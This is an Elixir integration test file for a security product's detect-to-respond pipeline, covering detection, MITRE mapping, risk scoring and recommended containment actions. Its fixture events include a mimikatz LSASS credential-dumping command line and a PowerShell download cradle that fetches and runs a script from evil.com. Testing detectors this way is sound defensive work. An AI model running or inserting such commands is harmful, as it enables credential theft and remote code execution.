defmodule TamanduaServer.Integration.DetectRespondPipelineTest do
  @moduledoc """
  End-to-end integration tests for the full detect -> correlate -> alert -> respond pipeline.

  Tests the complete lifecycle:
  1. A malicious telemetry event enters the detection engine
  2. The detection engine produces an alert with detections
  3. The alert carries correct MITRE ATT&CK mappings
  4. The autonomous response engine assesses risk and recommends actions
  5. The response executor can build the corresponding command

  These tests exercise the real module logic (Sigma matching, IOC lookup,
  behavioral heuristics, threat scoring, alert creation, risk assessment,
  action recommendation) while mocking only external services (ML inference,
  agent WebSocket transport).
  """

  use TamanduaServer.DataCase, async: false

  alias TamanduaServer.Detection.Engine
  alias TamanduaServer.Detection.{Correlator, EngineSupervisor}
  alias TamanduaServer.Alerts
  alias TamanduaServer.Response.{Executor, AutonomousEngine}
  alias TamanduaServer.ThreatIntel.CampaignTracker

  @moduletag :integration

  # ────────────────────────────────────────────────────────────────────────────
  # Setup: ensure all required GenServers / ETS tables are running
  # ────────────────────────────────────────────────────────────────────────────

  setup do
    # The ShardRegistry must exist before EngineSupervisor can start workers.
    # It is normally started by the application supervision tree, but ensure
    # it is present in case the test application did not fully boot.
    case Registry.start_link(keys: :unique, name: TamanduaServer.Detection.ShardRegistry) do
      {:ok, _pid} -> :ok
      {:error, {:already_started, _pid}} -> :ok
    end

    # Start the sharded detection engine supervisor (creates ETS tables + workers)
    case Process.whereis(EngineSupervisor) do
      nil ->
        start_supervised!({EngineSupervisor, []})
      _pid ->
        :ok
    end

    # Start the facade Agent so Engine.start_link / status() works
    case Process.whereis(Engine) do
      nil -> start_supervised!(Engine)
      _pid -> :ok
    end

    # Start the Correlator for behavioral analysis
    case Process.whereis(Correlator) do
      nil -> start_supervised!(Correlator)
      _pid -> :ok
    end

    # Start the Autonomous Response Engine
    case Process.whereis(AutonomousEngine) do
      nil -> start_supervised!(AutonomousEngine)
      _pid -> :ok
    end

    # Start the Campaign Tracker
    case Process.whereis(CampaignTracker) do
      nil -> start_supervised!(CampaignTracker)
      _pid -> :ok
    end

    :ok
  end

  # ════════════════════════════════════════════════════════════════════════════
  # Test 1: Malicious process event -> detection -> alert
  # ════════════════════════════════════════════════════════════════════════════

  describe "mimikatz-like process event -> detection -> alert" do
    test "creates alert with high severity and MITRE T1003 mapping" do
      {_org, agent} = create_agent_with_org()

      # Simulate a process_create event that closely resembles mimikatz
      # targeting LSASS for credential dumping (T1003 / T1003.001).
      event = %{
        event_id: Ecto.UUID.generate(),
        agent_id: agent.id,
        event_type: :process_create,
        timestamp: System.system_time(:millisecond),
        payload: %{
          pid: 9876,
          ppid: 4321,
          name: "mimikatz.exe",
          path: "C:\\Temp\\mimikatz.exe",
          cmdline: "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
          user: "SYSTEM",
          is_elevated: true,
          is_signed: false,
          signer: nil,
          target_process: "lsass.exe"
        },
        # Include agent-side detections to ensure the engine aggregates them
        detections: [
          %{
            type: :behavioral,
            rule_name: "LSASS Credential Dumping",
            confidence: 0.95,
            description: "Process accessing LSASS memory for credential extraction",
            mitre_tactics: ["credential_access"],
            mitre_techniques: ["T1003", "T1003.001"],
            category: :credential_theft
          }
        ]
      }

      # ── Step 1: Run through Detection Engine ──
      {:ok, result} = Engine.analyze_event(event)

      assert result.event_id == event.event_id
      assert is_float(result.threat_score)
      # With the credential-theft detection, the threat score must be high
      assert result.threat_score >= 0.5,
             "Expected threat_score >= 0.5 for mimikatz, got #{result.threat_score}"

      # The result should carry the merged detections
      assert is_list(result.detections)
      assert length(result.detections) >= 1

      # Verify MITRE T1003 is present in the detection output
      all_techniques =
        result.detections
        |> Enum.flat_map(fn d -> d[:mitre_techniques] || [] end)
        |> Enum.uniq()

      assert "T1003" in all_techniques or "T1003.001" in all_techniques,
             "Expected T1003/T1003.001 in detections, got: #{inspect(all_techniques)}"

      # ── Step 2: Verify alert was created (if score met threshold) ──
      if result.alert_id do
        alert = Alerts.get_alert!(result.alert_id)

        assert alert.severity in ["high", "critical"],
               "Expected severity high or critical for credential theft, got: #{alert.severity}"
        assert alert.title != nil
        assert is_binary(alert.agent_id)

        # MITRE techniques should be persisted on the alert
        assert is_list(alert.mitre_techniques)

        has_t1003 =
          Enum.any?(alert.mitre_techniques, &String.starts_with?(&1, "T1003"))

        assert has_t1003,
               "Alert mitre_techniques should contain T1003*, got: #{inspect(alert.mitre_techniques)}"

        # Evidence should be populated
        assert is_map(alert.evidence)
      end

      # ── Step 3: Autonomous engine risk assessment ──
      alert_map = %{
        id: result.alert_id || Ecto.UUID.generate(),
        agent_id: agent.id,
        severity: "critical",
        title: "LSASS Credential Dumping",
        mitre_techniques: ["T1003", "T1003.001"],
        mitre_tactics: ["credential_access"],
        evidence: %{pid: 9876},
        process_chain: [
          %{name: "mimikatz.exe", pid: 9876},
          %{name: "cmd.exe", pid: 4321}
        ]
      }

      {:ok, assessment} = AutonomousEngine.assess_risk(alert_map)

      assert is_float(assessment.risk_score)
      assert assessment.risk_score > 0.0

      # T1003 has danger 0.95 in the technique_danger map, so technique_score
      # should be very high.
      assert assessment.technique_score >= 0.9,
             "Expected technique_score >= 0.9 for T1003, got #{assessment.technique_score}"

      # ── Step 4: Verify recommended actions include kill + quarantine ──
      {:ok, actions} = AutonomousEngine.recommend_actions(assessment)

      assert is_list(actions)
      assert length(actions) >= 1

      action_types = Enum.map(actions, & &1.action_type)

      # Credential theft should trigger kill_process and quarantine_file
      assert "kill_process" in action_types,
             "Expected kill_process in recommended actions, got: #{inspect(action_types)}"
      assert "quarantine_file" in action_types,
             "Expected quarantine_file in recommended actions, got: #{inspect(action_types)}"

      # Each action should carry reasoning text
      for action <- actions do
        assert is_binary(action.reasoning)
        assert action.reasoning != ""
      end

      # ── Step 5: Verify Executor can build a command ──
      command = Executor.__info__(:functions)
                |> Keyword.has_key?(:kill_process)

      assert command, "Executor should expose kill_process/3"

      # Build the command structure that Executor.build_command would produce
      # (private, so we verify through execute_action which wraps it)
      # Since there's no live agent, we expect :agent_not_found
      assert {:error, :agent_not_found} = Executor.kill_process(agent.id, 9876, force: true)
    end
  end

  # ════════════════════════════════════════════════════════════════════════════
  # Test 2: Suspicious file write -> YARA-like detection -> alert with evidence
  # ════════════════════════════════════════════════════════════════════════════

  describe "suspicious file write -> detection -> alert with evidence" do
    test "file event with known malware hash produces alert with file evidence" do
      {_org, agent} = create_agent_with_org()

      # Use a hash that mimics a well-known malware sample
      malicious_hash = "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"

      event = %{
        event_id: Ecto.UUID.generate(),
        agent_id: agent.id,
        event_type: :file_create,
        timestamp: System.system_time(:millisecond),
        payload: %{
          path: "C:\\Users\\victim\\Downloads\\invoice.pdf.exe",
          sha256: malicious_hash,
          size: 3_456_789,
          entropy: 7.85,
          is_executable: true
        },
        detections: [
          %{
            type: :yara,
            rule_name: "MALWARE_Ransomware_WannaCry",
            confidence: 0.98,
            description: "File matches WannaCry ransomware YARA signature",
            mitre_tactics: ["impact", "execution"],
            mitre_techniques: ["T1486", "T1204.002"],
            category: :ransomware,
            metadata: %{
              rule_file: "ransomware.yar",
              matched_strings: ["$wannacry_mutex", "$ransom_note_pattern"]
            }
          }
        ]
      }

      {:ok, result} = Engine.analyze_event(event)

      assert is_map(result)
      assert result.event_id == event.event_id
      assert result.threat_score >= 0.5

      # Detections should include the YARA match
      yara_detections =
        (result.detections || [])
        |> Enum.filter(fn d -> d[:type] == :yara end)

      assert length(yara_detections) >= 1,
             "Expected at least 1 YARA detection, got #{length(yara_detections)}"

      yara_det = List.first(yara_detections)
      assert yara_det.rule_name == "MALWARE_Ransomware_WannaCry"

      # If alert was created, verify evidence fields
      if result.alert_id do
        alert = Alerts.get_alert!(result.alert_id)

        assert alert.severity in ["high", "critical"]

        # Evidence should contain file hash and path
        evidence = alert.evidence || %{}

        has_file_info =
          Map.has_key?(evidence, "sha256") or
          Map.has_key?(evidence, "file_path") or
          Map.has_key?(evidence, :sha256) or
          Map.has_key?(evidence, :file_path) or
          Map.has_key?(evidence, "file_hashes") or
          Map.has_key?(evidence, :file_hashes)

        assert has_file_info,
               "Alert evidence should contain file hash or path, got: #{inspect(Map.keys(evidence))}"

        # raw_event should be stored for forensics
        assert alert.raw_event != nil
      end
    end
  end

  # ════════════════════════════════════════════════════════════════════════════
  # Test 3: Network IOC match -> alert -> autonomous response
  # ════════════════════════════════════════════════════════════════════════════

  describe "network C2 IOC match -> alert -> autonomous response" do
    test "connection to known C2 IP triggers alert and isolate recommendation" do
      {_org, agent} = create_agent_with_org()

      c2_ip = "185.220.101.42"

      event = %{
        event_id: Ecto.UUID.generate(),
        agent_id: agent.id,
        event_type: :network_connect,
        timestamp: System.system_time(:millisecond),
        payload: %{
          pid: 4444,
          process_name: "powershell.exe",
          local_ip: "192.168.1.50",
          local_port: 54321,
          remote_ip: c2_ip,
          remote_port: 443,
          protocol: "tcp",
          direction: "outbound"
        },
        detections: [
          %{
            type: :ioc,
            rule_name: "Known C2 IP Match",
            confidence: 0.92,
            description: "Outbound connection to known command-and-control server IP",
            mitre_tactics: ["command_and_control"],
            mitre_techniques: ["T1071", "T1573"],
            category: :c2_communication
          }
        ]
      }

      # ── Step 1: Detection ──
      {:ok, result} = Engine.analyze_event(event)
      assert result.threat_score >= 0.5

      # IOC-type detections should be present
      ioc_detections =
        (result.detections || [])
        |> Enum.filter(fn d -> d[:type] == :ioc end)

      assert length(ioc_detections) >= 1

      # ── Step 2: Autonomous response assessment ──
      alert_map = %{
        id: result.alert_id || Ecto.UUID.generate(),
        agent_id: agent.id,
        severity: "high",
        title: "C2 Communication Detected",
        mitre_techniques: ["T1071", "T1573"],
        mitre_tactics: ["command_and_control"],
        evidence: %{
          pid: 4444,
          remote_ip: c2_ip,
          process_name: "powershell.exe"
        },
        process_chain: [
          %{name: "powershell.exe", pid: 4444}
        ]
      }

      {:ok, assessment} = AutonomousEngine.assess_risk(alert_map)
      assert assessment.risk_score > 0.0
      assert assessment.severity == "high"

      # ── Step 3: Action recommendation ──
      {:ok, actions} = AutonomousEngine.recommend_actions(assessment)
      assert length(actions) >= 1

      action_types = Enum.map(actions, & &1.action_type)

      # High-severity alert should recommend at least kill_process or quarantine_file
      has_containment_action =
        "kill_process" in action_types or
        "quarantine_file" in action_types or
        "isolate_network" in action_types

      assert has_containment_action,
             "Expected containment action for C2 alert, got: #{inspect(action_types)}"

      # ── Step 4: Blast radius prediction ──
      {:ok, blast} = AutonomousEngine.predict_blast_radius("isolate_network", %{
        agent_id: agent.id
      })

      assert is_map(blast)
      assert Map.has_key?(blast, :affected_users)
      assert Map.has_key?(blast, :estimated_downtime)
      assert Map.has_key?(blast, :risk_level)
      assert blast.risk_level in ["low", "medium", "high", "critical"]

      # ── Step 5: Executor command build (agent offline) ──
      assert {:error, :agent_not_found} =
               Executor.isolate_network(agent.id, allowed_ips: ["10.0.0.1"])
    end
  end

  # ════════════════════════════════════════════════════════════════════════════
  # Test 4: Multi-event correlation -> storyline
  # ════════════════════════════════════════════════════════════════════════════

  describe "multi-event attack chain -> correlation -> storyline" do
    test "process chain Word -> cmd -> powershell -> network is correlated" do
      {_org, agent} = create_agent_with_org()

      now = System.system_time(:millisecond)

      # Simulate a phishing attack chain:
      # WINWORD.EXE (pid 1000, ppid 500)
      #   -> cmd.exe (pid 2000, ppid 1000)
      #     -> powershell.exe (pid 3000, ppid 2000)
      #       -> network_connect to external IP (pid 3000)

      chain_events = [
        %{
          event_id: Ecto.UUID.generate(),
          agent_id: agent.id,
          event_type: :process_create,
          timestamp: now - 4000,
          payload: %{
            pid: 1000,
            ppid: 500,
            name: "WINWORD.EXE",
            path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            cmdline: "winword.exe C:\\Users\\user\\Downloads\\invoice.docx",
            user: "user",
            is_elevated: false,
            is_signed: true,
            signer: "Microsoft Corporation"
          }
        },
        %{
          event_id: Ecto.UUID.generate(),
          agent_id: agent.id,
          event_type: :process_create,
          timestamp: now - 3000,
          payload: %{
            pid: 2000,
            ppid: 1000,
            name: "cmd.exe",
            path: "C:\\Windows\\System32\\cmd.exe",
            cmdline: "cmd.exe /c powershell.exe -ep bypass -nop",
            user: "user",
            is_elevated: false,
            is_signed: true,
            signer: "Microsoft Corporation"
          },
          detections: [
            %{
              type: :sigma,
              rule_name: "Office Application Spawning Shell",
              confidence: 0.85,
              description: "Office application spawned command shell",
              mitre_tactics: ["execution", "initial_access"],
              mitre_techniques: ["T1059.001", "T1204.002"]
            }
          ]
        },
        %{
          event_id: Ecto.UUID.generate(),
          agent_id: agent.id,
          event_type: :process_create,
          timestamp: now - 2000,
          payload: %{
            pid: 3000,
            ppid: 2000,
            name: "powershell.exe",
            path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            cmdline: "powershell.exe -ep bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
            user: "user",
            is_elevated: false,
            is_signed: true,
            signer: "Microsoft Corporation"
          },
          detections: [
            %{
              type: :behavioral,
              rule_name: "PowerShell Download Cradle",
              confidence: 0.90,
              description: "PowerShell downloading and executing remote script",
              mitre_tactics: ["execution", "command_and_control"],
              mitre_techniques: ["T1059.001", "T1105"]
            }
          ]
        },
        %{
          event_id: Ecto.UUID.generate(),
          agent_id: agent.id,
          event_type: :network_connect,
          timestamp: now - 1000,
          payload: %{
            pid: 3000,
            process_name: "powershell.exe",
            local_ip: "192.168.1.50",
            local_port: 61234,
            remote_ip: "203.0.113.99",
            remote_port: 80,
            protocol: "tcp",
            direction: "outbound"
          }
        }
      ]

      # ── Process all events through the detection engine ──
      results =
        Enum.map(chain_events, fn event ->
          {:ok, r} = Engine.analyze_event(event)
          r
        end)

      # All events should be processed successfully
      assert length(results) == 4

      # At least one event should have detections
      total_detections =
        results
        |> Enum.flat_map(fn r -> r.detections || [] end)
        |> length()

      assert total_detections >= 2,
             "Expected at least 2 detections from the attack chain, got #{total_detections}"

      # The combined threat scores should escalate across the chain
      scores = Enum.map(results, & &1.threat_score)
      assert Enum.all?(scores, &is_float/1)

      # ── Verify the correlator received the events ──
      # Give the async cast a moment to process
      Process.sleep(100)

      # Try to build a storyline for the powershell process (pid 3000)
      case Correlator.build_storyline(agent.id, 3000) do
        {:ok, storyline} ->
          assert storyline.agent_id == agent.id
          assert storyline.target_pid == 3000
          assert is_list(storyline.process_chain)
          assert length(storyline.process_chain) >= 1

          # Timeline should contain events
          assert is_list(storyline.timeline)

          # If the correlator built the full tree, the chain should
          # include the ancestor processes
          chain_pids = Enum.map(storyline.process_chain, & &1[:pid])

          if length(chain_pids) >= 2 do
            # At minimum powershell (3000) and its parent cmd (2000) should appear
            assert 3000 in chain_pids,
                   "Process chain should include target pid 3000, got: #{inspect(chain_pids)}"
          end

        {:error, :not_found} ->
          # Correlator may not have indexed the events yet -- this is acceptable
          # in a fast test environment. The important thing is that the events
          # were processed without error.
          :ok
      end

      # ── Combined risk assessment of the chain ──
      alert_map = %{
        id: Ecto.UUID.generate(),
        agent_id: agent.id,
        severity: "high",
        title: "Phishing Attack Chain: Word -> CMD -> PowerShell -> C2",
        mitre_techniques: ["T1204.002", "T1059.001", "T1105"],
        mitre_tactics: ["initial_access", "execution", "command_and_control"],
        process_chain: [
          %{name: "WINWORD.EXE", pid: 1000},
          %{name: "cmd.exe", pid: 2000},
          %{name: "powershell.exe", pid: 3000}
        ]
      }

      {:ok, assessment} = AutonomousEngine.assess_risk(alert_map)

      # Process chain with 2 LOLBins (cmd.exe, powershell.exe) should boost lineage risk
      assert assessment.lineage_risk >= 0.7,
             "Expected lineage_risk >= 0.7 for cmd+powershell chain, got #{assessment.lineage_risk}"
      assert assessment.risk_score > 0.0

      {:ok, actions} = AutonomousEngine.recommend_actions(assessment)
      assert length(actions) >= 1
    end
  end

  # ════════════════════════════════════════════════════════════════════════════
  # Test 5: Cross-agent campaign detection
  # ════════════════════════════════════════════════════════════════════════════

  describe "cross-agent campaign detection" do
    test "same IOC on 3+ agents triggers campaign attribution" do
      # Create multiple agents in the same organization
      org = insert!(:organization)

      agents =
        Enum.map(1..4, fn i ->
          insert!(:agent, %{
            organization_id: org.id,
            hostname: "workstation-#{i}",
            os_type: "windows"
          })
        end)

      shared_c2_ip = "198.51.100.42"
      shared_hash = "a" <> String.duplicate("b", 63)

      # Simulate the same IOC (C2 IP) appearing on all 4 agents
      for agent <- agents do
        event = %{
          event_id: Ecto.UUID.generate(),
          agent_id: agent.id,
          event_type: :network_connect,
          timestamp: System.system_time(:millisecond),
          payload: %{
            pid: :rand.uniform(65535),
            process_name: "svchost.exe",
            local_ip: "192.168.1.#{:rand.uniform(254)}",
            local_port: :rand.uniform(65535),
            remote_ip: shared_c2_ip,
            remote_port: 443,
            protocol: "tcp",
            direction: "outbound"
          },
          detections: [
            %{
              type: :ioc,
              rule_name: "Known C2 IP",
              confidence: 0.88,
              description: "Connection to known C2 server",
              mitre_tactics: ["command_and_control"],
              mitre_techniques: ["T1071"]
            }
          ]
        }

        {:ok, _result} = Engine.analyze_event(event)
      end

      # Record attributions for each agent with the same IOC
      for agent <- agents do
        CampaignTracker.record_attribution(%{
          alert_id: Ecto.UUID.generate(),
          agent_id: agent.id,
          actor: "APT29",
          confidence: 0.85,
          ioc_values: [shared_c2_ip, shared_hash]
        })
      end

      # Allow async processing
      Process.sleep(200)

      # Trigger auto-detection to cluster the attributions
      CampaignTracker.auto_detect_campaigns()
      Process.sleep(200)

      # ── Verify campaign state ──
      stats = CampaignTracker.get_stats()
      assert is_map(stats)
      assert Map.has_key?(stats, :attributions_recorded)
      assert stats.attributions_recorded >= 4,
             "Expected at least 4 attributions recorded, got #{stats.attributions_recorded}"

      # The shared IOC should be indexed
      campaigns_for_ioc = CampaignTracker.campaigns_for_ioc(shared_c2_ip)
      assert is_list(campaigns_for_ioc)

      # Check if agents are indexed
      for agent <- agents do
        agent_campaigns = CampaignTracker.campaigns_for_agent(agent.id)
        assert is_list(agent_campaigns)
      end

      # If campaigns were created, verify structure
      campaigns = CampaignTracker.list_campaigns()

      if length(campaigns) > 0 do
        campaign = List.first(campaigns)
        assert Map.has_key?(campaign, :actor) or Map.has_key?(campaign, :id)
      end
    end
  end

  # ════════════════════════════════════════════════════════════════════════════
  # Test 6: Full pipeline simulation (assess -> recommend -> threshold check)
  # ════════════════════════════════════════════════════════════════════════════

  describe "full autonomous pipeline simulation" do
    test "simulate/1 runs the entire pipeline without executing actions" do
      {_org, agent} = create_agent_with_org()

      alert_map = %{
        id: Ecto.UUID.generate(),
        agent_id: agent.id,
        severity: "critical",
        title: "Ransomware Detected - File Encryption Activity",
        mitre_techniques: ["T1486", "T1490"],
        mitre_tactics: ["impact"],
        evidence: %{
          pid: 7777,
          file_path: "C:\\Users\\victim\\Documents\\important.docx.encrypted"
        },
        process_chain: [
          %{name: "explorer.exe", pid: 1234},
          %{name: "suspicious.exe", pid: 7777}
        ]
      }

      {:ok, decision} = AutonomousEngine.simulate(alert_map)

      assert is_map(decision)
      assert decision.dry_run == true
      assert is_map(decision.assessment)
      assert is_list(decision.recommended_actions)
      assert decision.execution_mode in [:auto_execute, :auto_with_notify, :recommend, :alert_only]

      # T1486 (ransomware) has danger 1.0, so risk should be very high
      assert decision.assessment.technique_score >= 0.95,
             "Expected technique_score >= 0.95 for T1486, got #{decision.assessment.technique_score}"

      # Recommended actions for ransomware should include isolate + kill + quarantine
      action_types = Enum.map(decision.recommended_actions, & &1.action_type)

      assert "isolate_network" in action_types,
             "Ransomware should recommend isolate_network, got: #{inspect(action_types)}"
      assert "kill_process" in action_types,
             "Ransomware should recommend kill_process, got: #{inspect(action_types)}"
      assert "quarantine_file" in action_types,
             "Ransomware should recommend quarantine_file, got: #{inspect(action_types)}"

      # Execution results should show simulated (not actually executed)
      for exec_result <- decision.execution_results do
        assert exec_result.status == "simulated"
      end
    end

    test "process_alert/1 runs real pipeline and records decision" do
      {_org, agent} = create_agent_with_org()

      alert_map = %{
        id: Ecto.UUID.generate(),
        agent_id: agent.id,
        severity: "high",
        title: "Process Injection Detected",
        mitre_techniques: ["T1055", "T1055.001"],
        mitre_tactics: ["defense_evasion", "privilege_escalation"],
        evidence: %{pid: 5555},
        process_chain: []
      }

      {:ok, decision} = AutonomousEngine.process_alert(alert_map)

      assert decision.dry_run == false
      assert decision.execution_mode in [:auto_execute, :auto_with_notify, :recommend, :alert_only]

      # Decision should be recorded in ETS
      {:ok, decisions} = AutonomousEngine.get_decisions(limit: 10)
      assert is_list(decisions)

      # Stats should reflect the processed alert
      {:ok, stats} = AutonomousEngine.get_stats()
      assert stats.alerts_processed >= 1
    end
  end

  # ════════════════════════════════════════════════════════════════════════════
  # Test 7: Detection engine stats tracking
  # ════════════════════════════════════════════════════════════════════════════

  describe "detection engine statistics" do
    test "stats track events analyzed and detections across pipeline run" do
      {_org, agent} = create_agent_with_org()

      initial_stats = Engine.get_stats()
      initial_events = initial_stats.events_analyzed

      # Process a batch of events
      events =
        Enum.map(1..5, fn i ->
          %{
            event_id: Ecto.UUID.generate(),
            agent_id: agent.id,
            event_type: :process_create,
            timestamp: System.system_time(:millisecond) + i * 100,
            payload: %{
              pid: 10_000 + i,
              ppid: 1,
              name: "test_process_#{i}.exe",
              path: "C:\\Temp\\test_process_#{i}.exe",
              cmdline: "test_process_#{i}.exe --safe",
              user: "user",
              is_elevated: false,
              is_signed: true
            }
          }
        end)

      {:ok, results} = Engine.analyze_batch(events)
      assert length(results) == 5

      # Stats should reflect the new events
      updated_stats = Engine.get_stats()
      assert updated_stats.events_analyzed >= initial_events + 5,
             "Expected events_analyzed to increase by 5, was #{initial_events}, now #{updated_stats.events_analyzed}"
    end
  end

  # ════════════════════════════════════════════════════════════════════════════
  # Test 8: Feedback loop -- analyst verdict adjusts confidence
  # ════════════════════════════════════════════════════════════════════════════

  describe "analyst feedback loop adjusts autonomous confidence" do
    test "false positive verdict increases FP rate for the rule" do
      alert_id = Ecto.UUID.generate()
      rule_name = "TestRule_FP_#{System.unique_integer([:positive])}"

      # Record a false positive
      AutonomousEngine.record_outcome(alert_id, "false_positive", %{
        rule_name: rule_name
      })

      # Allow the cast to be processed
      Process.sleep(100)

      # The FP rate for the rule should have increased
      {:ok, adjustments} = AutonomousEngine.adjust_confidence(rule_name)
      assert is_map(adjustments)
      assert Map.has_key?(adjustments, rule_name)
      assert adjustments[rule_name] >= 0.0

      # Stats should record the false positive
      {:ok, stats} = AutonomousEngine.get_stats()
      assert stats.false_positives >= 1
    end

    test "confirmed verdict decreases FP rate for the rule" do
      alert_id = Ecto.UUID.generate()
      rule_name = "TestRule_TP_#{System.unique_integer([:positive])}"

      # First create some FP history so there's something to decrease
      AutonomousEngine.record_outcome(Ecto.UUID.generate(), "false_positive", %{rule_name: rule_name})
      Process.sleep(50)

      # Now confirm a detection
      AutonomousEngine.record_outcome(alert_id, "confirmed", %{rule_name: rule_name})
      Process.sleep(100)

      {:ok, adjustments} = AutonomousEngine.adjust_confidence(rule_name)
      # After one FP (+0.05) and one confirmed (-0.02), rate should be ~0.03
      assert adjustments[rule_name] >= 0.0

      {:ok, stats} = AutonomousEngine.get_stats()
      assert stats.true_positives >= 1
    end
  end

  # ════════════════════════════════════════════════════════════════════════════
  # Test 9: Threshold configuration
  # ════════════════════════════════════════════════════════════════════════════

  describe "autonomous engine threshold management" do
    test "thresholds can be read and updated" do
      {:ok, original} = AutonomousEngine.get_thresholds()

      assert is_map(original)
      assert Map.has_key?(original, :auto_execute)
      assert Map.has_key?(original, :auto_with_notify)
      assert Map.has_key?(original, :recommend)

      # Update thresholds
      {:ok, updated} = AutonomousEngine.update_thresholds(%{
        auto_execute: 0.99,
        recommend: 0.50
      })

      assert updated.auto_execute == 0.99
      assert updated.recommend == 0.50
      # auto_with_notify should remain unchanged
      assert updated.auto_with_notify == original.auto_with_notify

      # Restore original thresholds
      AutonomousEngine.update_thresholds(original)
    end
  end

  # ════════════════════════════════════════════════════════════════════════════
  # Test 10: Asset criticality affects response decisions
  # ════════════════════════════════════════════════════════════════════════════

  describe "asset criticality influences response decisions" do
    test "domain controller gets higher criticality score" do
      {_org, agent} = create_agent_with_org(%{hostname: "dc01-prod"})

      # Auto-detection should recognize "dc" in hostname
      criticality = AutonomousEngine.get_asset_criticality(agent.id)

      assert is_map(criticality)
      assert Map.has_key?(criticality, :score)
      assert criticality.score >= 0.9,
             "Expected DC to have criticality >= 0.9, got #{criticality.score}"
      assert criticality.role == "domain_controller"

      # Manual override
      :ok = AutonomousEngine.set_asset_criticality(agent.id, %{
        score: 1.0,
        role: "domain_controller",
        source: "manual"
      })

      updated = AutonomousEngine.get_asset_criticality(agent.id)
      assert updated.score == 1.0
      assert updated.source == "manual"
    end

    test "high-criticality asset boosts risk assessment" do
      {_org, agent} = create_agent_with_org(%{hostname: "db-production-01"})

      alert_map = %{
        id: Ecto.UUID.generate(),
        agent_id: agent.id,
        severity: "medium",
        title: "Suspicious Script Execution",
        mitre_techniques: ["T1059"],
        mitre_tactics: ["execution"],
        process_chain: []
      }

      {:ok, assessment} = AutonomousEngine.assess_risk(alert_map)

      # Database server should have elevated criticality
      assert assessment.criticality_score >= 0.8,
             "Expected criticality >= 0.8 for DB server, got #{assessment.criticality_score}"
    end
  end
end
